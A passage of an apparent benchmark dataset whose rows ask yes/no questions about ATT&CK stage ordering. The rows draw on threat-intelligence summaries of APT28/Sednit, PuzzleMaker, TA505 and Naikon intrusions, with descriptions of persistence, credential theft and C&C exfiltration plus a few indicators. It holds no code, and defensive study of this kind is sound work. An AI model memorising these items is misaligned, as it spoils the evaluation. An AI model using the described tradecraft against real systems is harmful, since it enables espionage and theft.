Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes,A journey to Zebrocy land
948,222,222-Command and Control-T1573-Encrypted Channel,"After using the malware to scan and stage files for exfiltration during the Collection phase, is the Sednit group likely to encrypt network traffic with AES or a custom algorithm for secure communication with its C&C server in the Command and Control phase?",Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.,"Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes,A journey to Zebrocy land
949,222,222-Command and Control-T1008-Fallback Channels,"After using the malware to scan for files and stage data for exfiltration during the Collection phase, is it likely that data will be sent to the primary C&C server over commonly used ports before a fallback C&C server embedded in the configuration becomes operational for communications?",Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.,"Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes,A journey to Zebrocy land
953,222,222-Discovery-T1083-File and Directory Discovery,"After performing defense evasion by deleting files and disabling security tools, is the Sednit group likely to gather information about the victim's computer and environment, including registry keys enumeration and running process listing, before scanning for files matching specific extensions on local and network drives?","Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.","Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.
Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes,A journey to Zebrocy land
955,223,223-Command and Control-T1104-Multi-Stage Channels,"After exploiting a chain of Google Chrome and Microsoft Windows zero-day vulnerabilities to gain initial access and achieving privilege escalation using CVE-2021-31955 and CVE-2021-31956, is it likely that the Stager module will notify of successful exploitation before downloading and executing a malware Dropper module to further the attack?","Command and Control: The attack chain included four additional malware modules: Stager, Dropper, Service, and Remote shell. The Stager module notified of successful exploitation, downloaded, and executed a malware Dropper module from a remote server. The Dropper installed two executables pretending to be legitimate Windows files, with one registered as a service and used as a launcher for the Remote shell, which acted as the main payload. The Remote shell module communicated with a C&C server and could download/upload files, create processes, sleep, and delete itself from the compromised machine.","Initial Access: On April 14-15, 2021, Kaspersky detected a wave of highly targeted attacks against multiple companies, which were conducted through the Chrome browser. The attackers exploited a chain of Google Chrome and Microsoft Windows zero-day exploits. Although the exploit used for remote code execution (RCE) in Chrome was not retrieved, an elevation of privilege (EoP) exploit was analyzed, which was used to escape the sandbox and obtain system privileges.
Privilege Escalation: The attackers utilized an elevation of privilege exploit fine-tuned against the latest builds of Windows 10, exploiting two distinct vulnerabilities in the Windows OS kernel. These vulnerabilities, CVE-2021-31955 and CVE-2021-31956, were reported to Microsoft on April 20, 2021, and patched on June 8, 2021. CVE-2021-31955 is an information disclosure vulnerability in ntoskrnl.exe related to the SuperFetch feature, while CVE-2021-31956 is a heap-based buffer overflow in ntfs.sys. The exploit used CVE-2021-31955 to obtain kernel addresses and CVE-2021-31956 along with Windows Notification Facility (WNF) to create arbitrary memory read and write primitives. The exploit also used a ""PreviousMode"" technique to inject malware into the system process.
Others: Kaspersky products detected the attacks using the Behavioral Detection Engine and the Exploit Prevention component. The threat actor behind these attacks is referred to as PuzzleMaker. Kaspersky thanked Microsoft for their prompt analysis and patches. The malware modules are detected with the verdicts PDM:Exploit.Win32.Generic, PDM:Trojan.Win32.Generic, and UDS:DangerousObject.Multi.Generic. The hashes for the executables involved in the attack are provided for %SYSTEM%\WmiPrvMon.exe and %SYSTEM%\wmimon.dll.",Yes,PuzzleMaker attacks with Chrome zero-day exploit chain _ Securelist
958,224,224-Execution-T1204-User Execution,"After initiating with a spear phishing email that contains a malicious macro and before setting a persistence mechanism by creating a ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" entry pointing to ""winserv.exe"", is it likely that the macro code will download ""rtegre.exe"" and ""wprgxyeqd79.exe"" and store them in the C:\Users\Public directory?","Execution: The macro code, upon execution, downloaded two files from the domain kentona[.su, specifically ""rtegre.exe"" and ""wprgxyeqd79.exe"", and stored them in the C:\Users\Public directory. These files were identified as a Trojan/Downloader and a Self-Extracting Archive (SFX), respectively. The SFX contained four files that were extracted to the %TEMP% folder and executed a batch script named ""i.cmd"" which in turn executed ""uninstall.exe"", another SFX archive, containing the RMS (Remote Manipulator System) client by TektonIT.","Initial Access: The intercepted attack began with a spear phishing email containing a spreadsheet with a malicious macro. The macro was triggered when the user attempted to view the content, initiating the infection process.
Persistence: The attack ensured persistence on the victim's machine by setting the ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" registry key with a new entry named ""Windows Anytime Upgrade"" pointing to ""winserv.exe"" stored in the ""%ALLUSERSPROFILE%\Windows Anytime Upgrade"" directory.
Defense Evasion: The RMS client, ""winserv.exe"", was encrypted using the MPress PE compressor utility to avoid antivirus detection. The script also continuously killed every ""rundll32.exe"" process on the victim machine to generate noise and avoid detection.
Command and Control: The RMS client established a connection with a command and control server hosted on a Bulgarian remote host 217.12.201.159, part of a Virtual Dedicated Server subnet of the AS-21100, operated by ITL LLC.
Others: The TA505 group, known for targeting the Banking and Retail sectors, may be expanding their operations to other industries. This conclusion is based on the similarities between the current attack and a previous campaign against a US retail company, which also used the RMS software. The campaign appears to be ongoing, with slight changes observed in the dropped files.",Yes,TA505 is Expanding its Operations
966,226,226-Command and Control-T1071-Application Layer Protocol,"After gathering detailed system and network information through the Aria-body backdoor during the Discovery tactic, is the Naikon APT group likely to use HTTP and TCP protocols for sending collected data and listening for additional commands during the Command and Control stage?","Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
967,226,226-Discovery-T1082-System Information Discovery,"After the Aria-body loader establishes persistence through the 'Startup' folder or the 'Run' registry key, is it likely that the Aria-body backdoor will gather system information such as host-name, computer-name, and public IP during the Discovery phase before sending collected data to the C&C domain via an XORed password during Command and Control?","Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
969,226,226-Discovery-T1518-Software Discovery,"After the Aria-body backdoor achieves persistence through the 'Startup' folder or the 'Run' registry key followed by injecting itself into 'rundll32.exe' or 'dllhost.exe', is it likely to gather information about the victim's machine, including details of the installed software and Windows version for discovery purposes?","Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
970,226,226-Discovery-T1057-Process Discovery,"After evading defenses by operating C&C servers in limited time windows and utilizing fileless loading techniques, is it likely that the Naikon APT group used the Aria-body backdoor to gather information about active processes during its discovery phase before utilizing HTTP and TCP protocols to communicate with the C&C server?","Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
971,226,226-Discovery-T1049-System Network Connections Discovery,"Is it likely that the Naikon APT group will establish persistence using the 'Startup' folder or 'Run' registry key and execute the Aria-body loader's tasks such as injecting into processes, decrypting configuration data, and contacting C&C servers before gathering network-related information like TCP and UDP table status through the Aria-body backdoor?","Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
972,226,226-Collection-T1113-Screen Capture,"After the Aria-body backdoor gathers detailed system information, hostname, and public IP during the Discovery phase, is it likely to proceed towards creating/deleting files, taking screenshots, and other data collection activities as part of the Collection phase?","Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.
Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
979,228,228-Defense Evasion-T1622-Debugger Evasion,"During the attack sequence involving the APT28/Sofacy group's use of the 'Komplex' and 'XAgent' malware, is it likely that the Komplex Binder saves and executes a second payload on the system before the XAgent component checks for the presence of a debugger to evade detection?","Defense Evasion: The CTI report mentions that the XAgent component checks for the presence of a debugger during its initialization process and exits if one is found, as a means of defense evasion. Additionally, the Komplex Binder opens a decoy PDF file to distract the user while the actual payload is being executed.","Initial Access: The CTI report details an attack flow initiated by the APT28/Sofacy group using a Mac OS X Trojan named 'Komplex'. The attack begins with the Komplex Binder, which is an executable named 'roskosmos_2015-2025.app'. Its primary function is to save a second payload, the dropper, on the system and open a decoy PDF file. The Komplex Dropper's main role is to drop the final payload, ensuring persistence on the infected system by creating directories and modifying file permissions. The final payload, the Komplex Payload, is responsible for downloading and executing files as directed by the C&C servers. The report suggests that the XAgent malware is likely distributed via the Komplex malware.
Execution: The CTI report describes the initialization of the XAgent component's main module, BootXLoader, which checks for debugger presence and waits for internet connectivity before initializing communication with C&C servers. The MainHandler module starts and manages C&C commands and spying modules.
Persistence: The report indicates that the Komplex Dropper ensures persistence on the infected system by creating directories and modifying file permissions. Additionally, the Launcher module within XAgent is responsible for generating the malware's file path on the infected system and re-executing itself. The malware is located in a random directory within the '<UserHomedir>/Library/Assistants/.local/' path, with both the directory and filename picked from hardcoded lists.
Credential Access: The Password module within XAgent is used to obtain passwords from Firefox browser profiles, which are then saved to a file to be sent to the C&C servers.
Discovery: The InfoOS module within XAgent gathers information from the infected computer, such as IOPlatformUUID, process list, and operating system version. The RemoteShell module lists installed applications and iPhone backups.
Collection: The FileSystem module within XAgent is used for file management, including finding, deleting, executing, and creating files. The CameraShot module, although not implemented, suggests an intention to capture images, potentially for data collection purposes.
Command and Control: The CTI report details the communication process between the XAgent malware and the C&C servers. It starts by selecting a C&C server from a hardcoded list, sends a hello message, and then starts two main communication threads: one for receiving commands and one for sending data. The HTTPChannel module is used for continuous communication with the C&C server, receiving commands, and sending stolen data.
Exfiltration: The CTI report describes the use of the msgPacket structure for exfiltrating information to the C&C server, such as screenshots, passwords, files, and more. The data is encrypted with RC4 and sent in a POST request to the C&C server.
Others: The CTI report provides an overview of the APT28 group's targeting of Mac OS X users with the XAgent malware, highlighting the need for organizations to address computer security across all operating systems. Bitdefender, the CTI vendor, emphasizes the importance of unified security measures to prevent determined attackers from exploiting devices and networks.",Yes,Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web
981,228,228-Defense Evasion-T1564-Hide Artifacts,"After the Komplex Dropper ensures persistence by creating directories and modifying file permissions, is it likely that the Komplex Binder will execute the actual payload while simultaneously opening a decoy PDF file to distract the user as part of defense evasion?","Defense Evasion: The CTI report mentions that the XAgent component checks for the presence of a debugger during its initialization process and exits if one is found, as a means of defense evasion. Additionally, the Komplex Binder opens a decoy PDF file to distract the user while the actual payload is being executed.","Initial Access: The CTI report details an attack flow initiated by the APT28/Sofacy group using a Mac OS X Trojan named 'Komplex'. The attack begins with the Komplex Binder, which is an executable named 'roskosmos_2015-2025.app'. Its primary function is to save a second payload, the dropper, on the system and open a decoy PDF file. The Komplex Dropper's main role is to drop the final payload, ensuring persistence on the infected system by creating directories and modifying file permissions. The final payload, the Komplex Payload, is responsible for downloading and executing files as directed by the C&C servers. The report suggests that the XAgent malware is likely distributed via the Komplex malware.
Execution: The CTI report describes the initialization of the XAgent component's main module, BootXLoader, which checks for debugger presence and waits for internet connectivity before initializing communication with C&C servers. The MainHandler module starts and manages C&C commands and spying modules.
Persistence: The report indicates that the Komplex Dropper ensures persistence on the infected system by creating directories and modifying file permissions. Additionally, the Launcher module within XAgent is responsible for generating the malware's file path on the infected system and re-executing itself. The malware is located in a random directory within the '<UserHomedir>/Library/Assistants/.local/' path, with both the directory and filename picked from hardcoded lists.
Credential Access: The Password module within XAgent is used to obtain passwords from Firefox browser profiles, which are then saved to a file to be sent to the C&C servers.
Discovery: The InfoOS module within XAgent gathers information from the infected computer, such as IOPlatformUUID, process list, and operating system version. The RemoteShell module lists installed applications and iPhone backups.
Collection: The FileSystem module within XAgent is used for file management, including finding, deleting, executing, and creating files. The CameraShot module, although not implemented, suggests an intention to capture images, potentially for data collection purposes.
Command and Control: The CTI report details the communication process between the XAgent malware and the C&C servers. It starts by selecting a C&C server from a hardcoded list, sends a hello message, and then starts two main communication threads: one for receiving commands and one for sending data. The HTTPChannel module is used for continuous communication with the C&C server, receiving commands, and sending stolen data.
Exfiltration: The CTI report describes the use of the msgPacket structure for exfiltrating information to the C&C server, such as screenshots, passwords, files, and more. The data is encrypted with RC4 and sent in a POST request to the C&C server.
Others: The CTI report provides an overview of the APT28 group's targeting of Mac OS X users with the XAgent malware, highlighting the need for organizations to address computer security across all operating systems. Bitdefender, the CTI vendor, emphasizes the importance of unified security measures to prevent determined attackers from exploiting devices and networks.",Yes,Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web
983,228,228-Discovery-T1082-System Information Discovery,"After the XAgent component sends a hello message to its Command and Control (C&C) server and communicates with the server to receive commands via the HTTPChannel module, is the InfoOS module likely to gather system information such as IOPlatformUUID and operating system version to prepare for further data collection or exfiltration activities?","Discovery: The InfoOS module within XAgent gathers information from the infected computer, such as IOPlatformUUID, process list, and operating system version. The RemoteShell module lists installed applications and iPhone backups.","Initial Access: The CTI report details an attack flow initiated by the APT28/Sofacy group using a Mac OS X Trojan named 'Komplex'. The attack begins with the Komplex Binder, which is an executable named 'roskosmos_2015-2025.app'. Its primary function is to save a second payload, the dropper, on the system and open a decoy PDF file. The Komplex Dropper's main role is to drop the final payload, ensuring persistence on the infected system by creating directories and modifying file permissions. The final payload, the Komplex Payload, is responsible for downloading and executing files as directed by the C&C servers. The report suggests that the XAgent malware is likely distributed via the Komplex malware.
Execution: The CTI report describes the initialization of the XAgent component's main module, BootXLoader, which checks for debugger presence and waits for internet connectivity before initializing communication with C&C servers. The MainHandler module starts and manages C&C commands and spying modules.
Persistence: The report indicates that the Komplex Dropper ensures persistence on the infected system by creating directories and modifying file permissions. Additionally, the Launcher module within XAgent is responsible for generating the malware's file path on the infected system and re-executing itself. The malware is located in a random directory within the '<UserHomedir>/Library/Assistants/.local/' path, with both the directory and filename picked from hardcoded lists.
Defense Evasion: The CTI report mentions that the XAgent component checks for the presence of a debugger during its initialization process and exits if one is found, as a means of defense evasion. Additionally, the Komplex Binder opens a decoy PDF file to distract the user while the actual payload is being executed.
Credential Access: The Password module within XAgent is used to obtain passwords from Firefox browser profiles, which are then saved to a file to be sent to the C&C servers.
Collection: The FileSystem module within XAgent is used for file management, including finding, deleting, executing, and creating files. The CameraShot module, although not implemented, suggests an intention to capture images, potentially for data collection purposes.
Command and Control: The CTI report details the communication process between the XAgent malware and the C&C servers. It starts by selecting a C&C server from a hardcoded list, sends a hello message, and then starts two main communication threads: one for receiving commands and one for sending data. The HTTPChannel module is used for continuous communication with the C&C server, receiving commands, and sending stolen data.
